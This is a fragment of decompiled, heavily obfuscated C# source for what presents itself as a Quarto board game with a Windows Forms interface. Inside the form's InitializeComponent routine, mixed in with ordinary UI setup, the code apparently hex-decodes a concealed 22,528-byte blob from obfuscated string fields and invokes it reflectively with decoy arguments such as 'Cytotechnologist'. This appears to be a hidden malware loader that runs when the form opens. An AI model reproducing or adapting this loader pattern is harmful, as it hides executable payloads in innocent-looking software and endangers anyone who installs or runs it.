					if (mem[num3, 1].Point == mem[num3, 2].Point)
					{
						num32 = -1582016994;
						num33 = -1582016994;
					}
					else
					{
						num32 = -2041734809;
						num33 = -2041734809;
					}
					num = num32 ^ (int)(num2 * 791675278);
					continue;
				}
				case 56u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = (int)(num2 * 815342523) ^ -1707417517;
						continue;
					}
					goto IL_03fa;
				case 55u:
					if (mem[2, 1] != null)
					{
						num = ((int)num2 * -586461354) ^ -2016426421;
						continue;
					}
					goto IL_005b;
				case 54u:
					flag = true;
					num = (int)(num2 * 271036625) ^ -1650380431;
					continue;
				case 53u:
					num17 = ((mem[2, num3].Square == mem[3, num3].Square) ? 1 : 0);
					goto IL_0086;
				case 52u:
				{
					int num12;
					int num13;
					if (mem[num3, 2] != null)
					{
						num12 = -1752438020;
						num13 = -1752438020;
					}
					else
					{
						num12 = -1198681183;
						num13 = -1198681183;
					}
					num = num12 ^ ((int)num2 * -2100300115);
					continue;
				}
				case 51u:
				{
					int num69;
					int num70;
					if (mem[num3, 1].Square == mem[num3, 2].Square)
					{
						num69 = -663037684;
						num70 = -663037684;
					}
					else
					{
						num69 = -586492062;
						num70 = -586492062;
					}
					num = num69 ^ ((int)num2 * -2079945951);
					continue;
				}
				case 50u:
					if (mem[num3, 2].Square != mem[num3, 3].Square)
					{
						num = ((int)num2 * -1004015318) ^ -1638322455;
						continue;
					}
					goto IL_04f5;
				case 49u:
				{
					int num61;
					int num62;
					if (mem[num3, 1] != null)
					{
						num61 = 613709532;
						num62 = 613709532;
					}
					else
					{
						num61 = 1448965856;
						num62 = 1448965856;
					}
					num = num61 ^ ((int)num2 * -1283747503);
					continue;
				}
				case 48u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = ((int)num2 * -2119508249) ^ 0x3DF90FD4;
						continue;
					}
					goto IL_0559;
				case 47u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = ((int)num2 * -1805488123) ^ -1012711103;
						continue;
					}
					goto IL_058e;
				case 46u:
				{
					int num49;
					int num50;
					if (mem[1, 2].Big == mem[2, 1].Big)
					{
						num49 = 1036686906;
						num50 = 1036686906;
					}
					else
					{
						num49 = 883558624;
						num50 = 883558624;
					}
					num = num49 ^ (int)(num2 * 1143127208);
					continue;
				}
				case 45u:
					num = 1001189669;
					continue;
				case 44u:
				{
					int num44;
					if (num3 >= 4)
					{
						num = 915346553;
						num44 = 915346553;
					}
					else
					{
						num = 899664025;
						num44 = 899664025;
					}
					continue;
				}
				case 43u:
				{
					int num36;
					int num37;
					if (mem[1, num3].Dark != mem[2, num3].Dark)
					{
						num36 = -959520353;
						num37 = -959520353;
					}
					else
					{
						num36 = -1670194124;
						num37 = -1670194124;
					}
					num = num36 ^ (int)(num2 * 1813293733);
					continue;
				}
				case 42u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = (int)(num2 * 887829998) ^ -1730701992;
						continue;
					}
					goto IL_0559;
				case 41u:
				{
					int num28;
					int num29;
					if (mem[2, 2] != null)
					{
						num28 = -1025166513;
						num29 = -1025166513;
					}
					else
					{
						num28 = -994529123;
						num29 = -994529123;
					}
					num = num28 ^ (int)(num2 * 377184567);
					continue;
				}
				case 40u:
				{
					int num27;
					if (mem[num3, 0].Dark != mem[num3, 1].Dark)
					{
						num = 202694086;
						num27 = 202694086;
					}
					else
					{
						num = 2046407624;
						num27 = 2046407624;
					}
					continue;
				}
				case 39u:
					if (mem[0, 3] != null)
					{
						num = 1445763024;
						continue;
					}
					goto IL_005b;
				case 38u:
				{
					int num21;
					if (mem[num3, 0].Square != mem[num3, 1].Square)
					{
						num = 2107280437;
						num21 = 2107280437;
					}
					else
					{
						num = 1791432474;
						num21 = 1791432474;
					}
					continue;
				}
				case 37u:
					if (mem[num3, 2].Point != mem[num3, 3].Point)
					{
						num = ((int)num2 * -762067354) ^ -407138673;
						continue;
					}
					goto IL_04f5;
				case 36u:
				{
					int num14;
					int num15;
					if (mem[1, 1].Square != mem[2, 2].Square)
					{
						num14 = 1211219300;
						num15 = 1211219300;
					}
					else
					{
						num14 = 212063148;
						num15 = 212063148;
					}
					num = num14 ^ (int)(num2 * 807521612);
					continue;
				}
				case 35u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = (int)(num2 * 1582052308) ^ -1236928737;
						continue;
					}
					goto IL_058e;
				case 34u:
					if (mem[0, num3] != null)
					{
						num = 1240140647;
						continue;
					}
					goto IL_0085;
				case 33u:
				{
					int num71;
					int num72;
					if (mem[1, 2].Dark == mem[2, 1].Dark)
					{
						num71 = 844558457;
						num72 = 844558457;
					}
					else
					{
						num71 = 375876704;
						num72 = 375876704;
					}
					num = num71 ^ (int)(num2 * 1637337440);
					continue;
				}
				case 31u:
					num = ((int)num2 * -1110496450) ^ -873011555;
					continue;
				case 30u:
				{
					int num68;
					if (mem[0, 0].Square == mem[1, 1].Square)
					{
						num = 403134355;
						num68 = 403134355;
					}
					else
					{
						num = 1221498892;
						num68 = 1221498892;
					}
					continue;
				}
				case 29u:
					if (mem[0, num3].Square == mem[1, num3].Square)
					{
						num = 984611219;
						continue;
					}
					goto IL_0323;
				case 28u:
				{
					int num64;
					int num65;
					if (flag3)
					{
						num64 = 1555792755;
						num65 = 1555792755;
					}
					else
					{
						num64 = 1845828879;
						num65 = 1845828879;
					}
					num = num64 ^ (int)(num2 * 250626910);
					continue;
				}
				case 26u:
				{
					int num59;
					int num60;
					if (mem[0, num3].Big == mem[1, num3].Big)
					{
						num59 = 2044889610;
						num60 = 2044889610;
					}
					else
					{
						num59 = 600922620;
						num60 = 600922620;
					}
					num = num59 ^ (int)(num2 * 215364114);
					continue;
				}
				case 25u:
				{
					int num56;
					if (mem[0, num3].Dark == mem[1, num3].Dark)
					{
						num = 557941952;
						num56 = 557941952;
					}
					else
					{
						num = 1355054110;
						num56 = 1355054110;
					}
					continue;
				}
				case 24u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = (int)((num2 * 377383683) ^ 0x450EB509);
						continue;
					}
					goto IL_058e;
				case 23u:
				{
					int num55;
					if (mem[num3, 0].Point == mem[num3, 1].Point)
					{
						num = 1060816016;
						num55 = 1060816016;
					}
					else
					{
						num = 622495793;
						num55 = 622495793;
					}
					continue;
				}
				case 22u:
				{
					int num51;
					int num52;
					if (mem[0, 0] != null)
					{
						num51 = 736830035;
						num52 = 736830035;
					}
					else
					{
						num51 = 1684978992;
						num52 = 1684978992;
					}
					num = num51 ^ (int)(num2 * 748987203);
					continue;
				}
				case 21u:
				{
					int num47;
					int num48;
					if (mem[num3, 0].Big != mem[num3, 1].Big)
					{
						num47 = -1738078184;
						num48 = -1738078184;
					}
					else
					{
						num47 = -457442508;
						num48 = -457442508;
					}
					num = num47 ^ ((int)num2 * -137551085);
					continue;
				}
				case 20u:
				{
					int num42;
					int num43;
					if (mem[num3, 0] != null)
					{
						num42 = 1928381654;
						num43 = 1928381654;
					}
					else
					{
						num42 = 2097365195;
						num43 = 2097365195;
					}
					num = num42 ^ ((int)num2 * -2038366817);
					continue;
				}
				case 19u:
					if (mem[2, num3].Big != mem[3, num3].Big)
					{
						num = (int)((num2 * 381114298) ^ 0x3B21CEA2);
						continue;
					}
					goto IL_0a75;
				case 18u:
				{
					int num35;
					if (mem[0, 0].Point == mem[1, 1].Point)
					{
						num = 1576870327;
						num35 = 1576870327;
					}
					else
					{
						num = 1084542655;
						num35 = 1084542655;
					}
					continue;
				}
				case 17u:
					if (mem[1, 2] != null)
					{
						num = (int)(num2 * 1113784476) ^ -1532639990;
						continue;
					}
					goto IL_005b;
				case 16u:
					if (mem[num3, 2].Big != mem[num3, 3].Big)
					{
						num = ((int)num2 * -732963716) ^ -525269203;
						continue;
					}
					goto IL_04f5;
				case 15u:
				{
					int num30;
					int num31;
					if (mem[1, 2].Point == mem[2, 1].Point)
					{
						num30 = 572613574;
						num31 = 572613574;
					}
					else
					{
						num30 = 1236573203;
						num31 = 1236573203;
					}
					num = num30 ^ (int)(num2 * 573715871);
					continue;
				}
				case 14u:
					result = flag;
					num = 1381192790;
					continue;
				case 13u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = ((int)num2 * -1420912755) ^ 0x7A74EE21;
						continue;
					}
					goto IL_058e;
				case 12u:
					if (mem[2, num3].Dark != mem[3, num3].Dark)
					{
						num = (int)((num2 * 1604664882) ^ 0x1CFE202E);
						continue;
					}
					goto IL_0a75;
				case 11u:
				{
					int num25;
					int num26;
					if (mem[1, 1].Dark == mem[2, 2].Dark)
					{
						num25 = -392566945;
						num26 = -392566945;
					}
					else
					{
						num25 = -1111837652;
						num26 = -1111837652;
					}
					num = num25 ^ (int)(num2 * 98310587);
					continue;
				}
				case 10u:
				{
					int num22;
					int num23;
					if (mem[1, 1].Point == mem[2, 2].Point)
					{
						num22 = 1931408503;
						num23 = 1931408503;
					}
					else
					{
						num22 = 1034919479;
						num23 = 1034919479;
					}
					num = num22 ^ (int)(num2 * 105678036);
					continue;
				}
				case 9u:
				{
					int num20;
					if (mem[0, 3].Dark != mem[1, 2].Dark)
					{
						num = 1702766976;
						num20 = 1702766976;
					}
					else
					{
						num = 1937669440;
						num20 = 1937669440;
					}
					continue;
				}
				case 8u:
					if (mem[num3, 2].Dark != mem[num3, 3].Dark)
					{
						num = ((int)num2 * -928896979) ^ -1497785172;
						continue;
					}
					goto IL_04f5;
				case 7u:
				{
					int num16;
					if (mem[0, 3].Point == mem[1, 2].Point)
					{
						num = 1323156030;
						num16 = 1323156030;
					}
					else
					{
						num = 1701385374;
						num16 = 1701385374;
					}
					continue;
				}
				case 6u:
					flag = true;
					num = ((int)num2 * -1030061340) ^ -176887020;
					continue;
				case 5u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = (int)(num2 * 1541223424) ^ -833762400;
						continue;
					}
					goto IL_0559;
				case 4u:
					if (mem[2, num3].Point != mem[3, num3].Point)
					{
						num = ((int)num2 * -232738184) ^ -839476408;
						continue;
					}
					goto IL_0a75;
				case 3u:
				{
					int num8;
					int num9;
					if (mem[num3, 1].Dark == mem[num3, 2].Dark)
					{
						num8 = -1346610390;
						num9 = -1346610390;
					}
					else
					{
						num8 = -194407981;
						num9 = -194407981;
					}
					num = num8 ^ ((int)num2 * -1084935247);
					continue;
				}
				case 2u:
				{
					int num6;
					int num7;
					if (mem[num3, 1].Big != mem[num3, 2].Big)
					{
						num6 = 1338810993;
						num7 = 1338810993;
					}
					else
					{
						num6 = 1649229111;
						num7 = 1649229111;
					}
					num = num6 ^ (int)(num2 * 1310678621);
					continue;
				}
				case 1u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = 594386117;
						continue;
					}
					goto IL_03fa;
				case 0u:
					num3++;
					num = ((int)num2 * -1946007747) ^ -955161323;
					continue;
				case 27u:
					break;
				default:
					{
						return result;
					}
					IL_005c:
					flag3 = (byte)num24 != 0;
					num = 428601337;
					continue;
					IL_03fa:
					num24 = 0;
					goto IL_005c;
					IL_0085:
					num17 = 0;
					goto IL_0086;
					IL_0a75:
					num17 = 1;
					goto IL_0086;
					IL_0086:
					flag2 = (byte)num17 != 0;
					num = 733450242;
					continue;
					IL_0323:
					num17 = 0;
					goto IL_0086;
					IL_058e:
					num24 = 1;
					goto IL_005c;
					IL_0559:
					num24 = 1;
					goto IL_005c;
					IL_005b:
					num24 = 0;
					goto IL_005c;
					IL_04f5:
					num17 = 1;
					goto IL_0086;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		int num4 = default(int);
		bool flag = default(bool);
		int num3 = default(int);
		bool flag2 = default(bool);
		bool result = default(bool);
		while (true)
		{
			int num = 227859046;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x4495EFFu) % 13u)
				{
				case 12u:
					num4 = 0;
					num = 834112336;
					continue;
				case 11u:
					flag = true;
					num3 = 0;
					num = (int)(num2 * 1170447502) ^ -199381715;
					continue;
				case 10u:
					num = (int)((num2 * 1758301188) ^ 0x6B6E5E27);
					continue;
				case 9u:
					flag2 = num3 < 4;
					num = 1921431129;
					continue;
				case 8u:
				{
					int num6;
					if (num4 >= 4)
					{
						num = 1462271634;
						num6 = 1462271634;
					}
					else
					{
						num = 855889218;
						num6 = 855889218;
					}
					continue;
				}
				case 7u:
					num4++;
					num = 834112336;
					continue;
				case 6u:
					result = flag;
					num = ((int)num2 * -2022009876) ^ 0x48598BA5;
					continue;
				case 4u:
					num3++;
					num = ((int)num2 * -1885333244) ^ -506329949;
					continue;
				case 3u:
				{
					int num7;
					int num8;
					if (flag2)
					{
						num7 = -1581809103;
						num8 = -1581809103;
					}
					else
					{
						num7 = -1013444102;
						num8 = -1013444102;
					}
					num = num7 ^ ((int)num2 * -1217490914);
					continue;
				}
				case 1u:
				{
					int num5;
					if (mem[num3, num4] == null)
					{
						num = 773676703;
						num5 = 773676703;
					}
					else
					{
						num = 1634074925;
						num5 = 1634074925;
					}
					continue;
				}
				case 0u:
					flag = false;
					num = (int)((num2 * 160148414) ^ 0x7BDE666D);
					continue;
				case 2u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		while (true)
		{
			int num = -435590416;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x9EEE6BB6u) % 11u)
				{
				case 10u:
					num = ((int)num2 * -1249065347) ^ -1737656661;
					continue;
				case 8u:
					num = ((int)num2 * -2095111730) ^ 0x1737FDF6;
					continue;
				case 7u:
					Form1.smethod_32((Control)(object)label6, str);
					num = ((int)num2 * -982634114) ^ -1670085664;
					continue;
				case 6u:
					num = ((int)num2 * -699496981) ^ 0x2CB2DA1D;
					continue;
				case 5u:
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					num = ((int)num2 * -257324690) ^ -2028561984;
					continue;
				case 3u:
					Form1.smethod_32((Control)(object)label2, "");
					num = ((int)num2 * -1063881289) ^ -937562362;
					continue;
				case 2u:
					Form1.smethod_32((Control)(object)label5, "Игрок: ");
					num = (int)(num2 * 394885425) ^ -1081152618;
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)label1, "");
					num = ((int)num2 * -2035351629) ^ -2090113613;
					continue;
				case 0u:
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					num = ((int)num2 * -311485484) ^ -570349469;
					continue;
				default:
					return;
				case 9u:
					break;
				case 4u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing)
		{
			goto IL_0009;
		}
		int num = 0;
		goto IL_00a0;
		IL_0097:
		num = ((components != null) ? 1 : 0);
		goto IL_00a0;
		IL_0009:
		int num2 = -1710516960;
		goto IL_006a;
		IL_006a:
		bool flag = default(bool);
		while (true)
		{
			uint num3;
			switch ((num3 = (uint)num2 ^ 0xF9F95D50u) % 7u)
			{
			case 6u:
				break;
			case 5u:
			{
				int num4;
				int num5;
				if (!flag)
				{
					num4 = 120354437;
					num5 = 120354437;
				}
				else
				{
					num4 = 352223065;
					num5 = 352223065;
				}
				num2 = num4 ^ (int)(num3 * 2045848494);
				continue;
			}
			case 3u:
				num2 = (int)((num3 * 748303061) ^ 0x50211227);
				continue;
			case 1u:
				Form1.smethod_51((IDisposable)components);
				num2 = ((int)num3 * -626091965) ^ 0x5578979B;
				continue;
			case 0u:
				num2 = ((int)num3 * -1590552136) ^ 0x3C31208B;
				continue;
			case 4u:
				goto IL_0097;
			default:
				((Form)this).Dispose(disposing);
				return;
			}
			break;
		}
		goto IL_0009;
		IL_00a0:
		flag = (byte)num != 0;
		num2 = -1084826116;
		goto IL_006a;
	}

	private void InitializeComponent()
	{
		//IL_0380: Unknown result type (might be due to invalid IL or missing references)
		//IL_038a: Expected O, but got Unknown
		components = Form1.smethod_52();
		byte[] array = default(byte[]);
		int num5 = default(int);
		string string_ = default(string);
		bool flag = default(bool);
		while (true)
		{
			int num = 958150468;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x6BC5AEB7u) % 133u)
				{
				case 132u:
					num = (int)((num2 * 1267627312) ^ 0x6445723D);
					continue;
				case 131u:
					array[num5] = Form1.smethod_69(Form1.smethod_68(string_, num5 * 2, 2), 16);
					num = (int)(num2 * 928707690) ^ -1056197968;
					continue;
				case 129u:
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					num = (int)((num2 * 1239452921) ^ 0xC66055);
					continue;
				case 128u:
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					num = ((int)num2 * -1011468665) ^ 0x289C7D86;
					continue;
				case 127u:
				{
					CharArray(array, string.Empty);
					object[] object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					Form1.smethod_70(ComMember, object_);
					num = (int)(num2 * 579707585) ^ -520465709;
					continue;
				}
				case 126u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = (int)((num2 * 1214770770) ^ 0x1EBB3C8E);
					continue;
				case 125u:
					pictureBox1 = Form1.smethod_2();
					num = ((int)num2 * -896514754) ^ 0x32F9D7EE;
					continue;
				case 124u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					num = ((int)num2 * -1495614180) ^ 0x50567785;
					continue;
				case 123u:
					num = ((int)num2 * -108998352) ^ 0xC69EAA5;
					continue;
				case 122u:
					flag = num5 < 22528;
					num = 193360131;
					continue;
				case 121u:
					num = ((int)num2 * -1515428371) ^ -807872315;
					continue;
				case 120u:
					num = (int)(num2 * 2096171473) ^ -962560631;
					continue;
				case 119u:
					num = ((int)num2 * -170649279) ^ 0x76AB5890;
					continue;
				case 118u:
					num = ((int)num2 * -547672275) ^ 0x4F8BE465;
					continue;
				case 117u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					num = (int)((num2 * 1596597125) ^ 0x62321B9F);
					continue;
				case 116u:
					num = (int)((num2 * 1298243373) ^ 0x65283A98);
					continue;
				case 115u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					num = (int)((num2 * 1496254748) ^ 0x55583AA);
					continue;
				case 114u:
					panel1 = Form1.smethod_55();
					timer1 = Form1.smethod_56(components);
					label1 = Form1.smethod_57();
					num = (int)((num2 * 1104201407) ^ 0x1506225);
					continue;
				case 113u:
					Form1.smethod_59((Control)(object)this);
					num = (int)((num2 * 1487188229) ^ 0x6A0543A8);
					continue;
				case 112u:
					num = (int)(num2 * 243295541) ^ -146110783;
					continue;
				case 111u:
					Form1.smethod_61((Control)(object)button1, "button1");
					num = (int)((num2 * 866130324) ^ 0x554835D3);
					continue;
				case 110u:
					num5++;
					num = ((int)num2 * -1461744292) ^ 0x62342AD;
					continue;
				case 109u:
					num = ((int)num2 * -1217299035) ^ -281496505;
					continue;
				case 108u:
					num = (int)(num2 * 422973720) ^ -1328477112;
					continue;
				case 107u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = ((int)num2 * -1599517990) ^ -220328934;
					continue;
				case 106u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = ((int)num2 * -336594354) ^ 0x4B264F40;
					continue;
				case 105u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					num = ((int)num2 * -1644271649) ^ 0x1EBBCBE;
					continue;
				case 104u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					Form1.smethod_5((Control)(object)this, Color.White);
					num = (int)(num2 * 2014885109) ^ -1628511053;
					continue;
				case 103u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = (int)((num2 * 372239562) ^ 0x5488E69C);
					continue;
				case 102u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					num = (int)((num2 * 1620645018) ^ 0x495B2DD0);
					continue;
				case 101u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = ((int)num2 * -1037884314) ^ -1863383014;
					continue;
				case 99u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = ((int)num2 * -875147519) ^ 0x4C109D4F;
					continue;
				case 98u:
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = ((int)num2 * -166577855) ^ 0x5A755F1A;
					continue;
				case 97u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					num = (int)((num2 * 1494361346) ^ 0x677AD113);
					continue;
				case 96u:
					string_ = Form1.smethod_34(string_, Veet.Xe);
					num = (int)(num2 * 917401093) ^ -181279398;
					continue;
				case 95u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = ((int)num2 * -973267945) ^ 0x4C393E74;
					continue;
				case 94u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					num = ((int)num2 * -644629388) ^ 0x2F527C9B;
					continue;
				case 93u:
					label6 = Form1.smethod_57();
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -465342486) ^ -987947914;
					continue;
				case 92u:
					num = ((int)num2 * -1138112681) ^ -149394620;
					continue;
				case 91u:
					num = ((int)num2 * -1129729683) ^ -1441808562;
					continue;
				case 90u:
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = (int)(num2 * 1489707065) ^ -2012468172;
					continue;
				case 89u:
					label2 = Form1.smethod_57();
					label5 = Form1.smethod_57();
					num = ((int)num2 * -1640990946) ^ -478419651;
					continue;
				case 88u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					num = (int)(num2 * 745392912) ^ -1251707140;
					continue;
				case 87u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = (int)((num2 * 654721250) ^ 0x29C8A35F);
					continue;
				case 86u:
					num = ((int)num2 * -194227544) ^ 0x47453068;
					continue;
				case 85u:
					Form1.smethod_64((Control)(object)label5, 12);
					num = (int)(num2 * 497728252) ^ -518922393;
					continue;
				case 84u:
					num = 1751982154;
					continue;
				case 83u:
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = (int)(num2 * 1614094835) ^ -339153350;
					continue;
				case 82u:
					Form1.smethod_64((Control)(object)panel1, 7);
					num = ((int)num2 * -1762111695) ^ -1828712253;
					continue;
				case 81u:
					num = (int)((num2 * 184173505) ^ 0x76BD6A62);
					continue;
				case 80u:
					num = ((int)num2 * -771099707) ^ 0x5ADCCE02;
					continue;
				case 79u:
					num = (int)((num2 * 1290425069) ^ 0x586C633E);
					continue;
				case 78u:
					num = (int)(num2 * 683416274) ^ -1016608012;
					continue;
				case 77u:
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					num = ((int)num2 * -6573495) ^ 0x7AF32999;
					continue;
				case 76u:
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = ((int)num2 * -703542366) ^ 0x663D8C80;
					continue;
				case 75u:
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					num = ((int)num2 * -1637434052) ^ -1737654826;
					continue;
				case 74u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = (int)((num2 * 663831735) ^ 0x47EFA679);
					continue;
				case 73u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = (int)(num2 * 1710333987) ^ -499182415;
					continue;
				case 72u:
					num = ((int)num2 * -1969985171) ^ -2023252019;
					continue;
				case 71u:
					num = ((int)num2 * -1194814042) ^ -1380967636;
					continue;
				case 70u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					num = (int)((num2 * 1856745126) ^ 0x6DA11933);
					continue;
				case 69u:
					Form1.smethod_64((Control)(object)button2, 4);
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -1536466144) ^ -2144430208;
					continue;
				case 68u:
					Form1.smethod_72(timer1, 1000);
					num = (int)(num2 * 2070595945) ^ -258089487;
					continue;
				case 67u:
					num = (int)((num2 * 1276543744) ^ 0xB5858D7);
					continue;
				case 66u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = (int)(num2 * 1616090190) ^ -3454806;
					continue;
				case 65u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					num = (int)((num2 * 1997458494) ^ 0xB21D9F0);
					continue;
				case 64u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					num = (int)((num2 * 776972869) ^ 0x56D30949);
					continue;
				case 63u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					num = ((int)num2 * -56585472) ^ 0x1C5EF5E4;
					continue;
				case 62u:
					num = (int)((num2 * 1320565257) ^ 0x7351A68A);
					continue;
				case 61u:
					Form1.smethod_61((Control)(object)label6, "label6");
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					num = ((int)num2 * -1780931006) ^ 0x7EBE82BD;
					continue;
				case 60u:
					Form1.smethod_61((Control)(object)label1, "label1");
					num = ((int)num2 * -1164596211) ^ -1587693624;
					continue;
				case 59u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = ((int)num2 * -1211897505) ^ -61339228;
					continue;
				case 58u:
					num = ((int)num2 * -833644152) ^ -458067735;
					continue;
				case 57u:
					array = new byte[22528];
					num = ((int)num2 * -596029463) ^ 0xE709C50;
					continue;
				case 56u:
					num = (int)((num2 * 1852774684) ^ 0x1D4CDB3F);
					continue;
				case 55u:
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					Form1.smethod_61((Control)(object)label2, "label2");
					num = (int)(num2 * 1507755672) ^ -608766934;
					continue;
				case 54u:
					Form1.smethod_62(pictureBox1, 0);
					num = ((int)num2 * -402142967) ^ 0x5FA4B6BF;
					continue;
				case 53u:
					num = ((int)num2 * -1604925447) ^ -166633570;
					continue;
				case 52u:
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					num = (int)(num2 * 1501326368) ^ -1965060236;
					continue;
				case 51u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = ((int)num2 * -1556570473) ^ -1660161293;
					continue;
				case 50u:
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = (int)((num2 * 1667033003) ^ 0x67E70A);
					continue;
				case 49u:
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = ((int)num2 * -987322192) ^ 0x5FD1EDFF;
					continue;
				case 48u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = ((int)num2 * -1614715356) ^ 0xD49D0F8;
					continue;
				case 47u:
					num5 = 0;
					num = (int)((num2 * 97619080) ^ 0x39F4F653);
					continue;
				case 46u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = ((int)num2 * -1612575075) ^ 0xDFD3295;
					continue;
				case 45u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 844641279) ^ -1423379930;
					continue;
				case 44u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					num = (int)(num2 * 1807038022) ^ -1480233374;
					continue;
				case 43u:
					string_ = Veet.Sa;
					num = ((int)num2 * -1890956609) ^ 0xA34554;
					continue;
				case 42u:
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -1982812969) ^ 0x19163C49;
					continue;
				case 41u:
					Form1.smethod_64((Control)(object)label1, 8);
					num = (int)(num2 * 1083851004) ^ -565788181;
					continue;
				case 40u:
					num = (int)(num2 * 1545121724) ^ -1362323227;
					continue;
				case 39u:
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = (int)(num2 * 498253192) ^ -1053551621;
					continue;
				case 38u:
					button2 = Form1.smethod_53();
					num = (int)(num2 * 1365945481) ^ -188831070;
					continue;
				case 37u:
					num = ((int)num2 * -1721373574) ^ -532366391;
					continue;
				case 36u:
					num = ((int)num2 * -1686785598) ^ 0x1B45B319;
					continue;
				case 35u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = ((int)num2 * -1680784858) ^ -1289949626;
					continue;
				case 34u:
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = (int)(num2 * 301081926) ^ -1382321021;
					continue;
				case 33u:
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = (int)((num2 * 2084931796) ^ 0x4F0040CC);
					continue;
				case 32u:
					richTextBox1 = Form1.smethod_54();
					num = (int)((num2 * 588325137) ^ 0x28441984);
					continue;
				case 31u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = (int)(num2 * 2067848315) ^ -692334442;
					continue;
				case 30u:
					num = (int)(num2 * 1180087706) ^ -1034126294;
					continue;
				case 29u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = (int)((num2 * 2056111812) ^ 0x6AD3772B);
					continue;
				case 28u:
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					num = ((int)num2 * -1307675548) ^ -2101709633;
					continue;
				case 27u:
					Form1.smethod_61((Control)(object)label5, "label5");
